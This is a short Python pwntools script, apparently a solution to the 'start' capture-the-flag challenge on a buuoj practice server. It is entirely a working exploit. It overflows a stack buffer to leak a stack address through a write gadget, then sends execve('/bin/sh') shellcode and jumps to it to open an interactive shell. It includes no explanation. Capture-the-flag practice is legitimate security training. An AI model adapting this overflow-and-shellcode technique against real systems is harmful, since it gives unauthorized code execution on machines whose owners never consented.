from pwn import *


# p = process("./start")
p = remote("node4.buuoj.cn", 27832)

sys_write = 0x08048087

# leak stack
p.recv()
pad = cyclic(0x14)+p32(sys_write)
p.send(pad)
stack = u32(p.recv(4))
print(hex(stack))

# ret to shellcode
code = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
pad = cyclic(0x14)+p32(stack-0x4+0x18)+code
p.send(pad)

p.interactive()


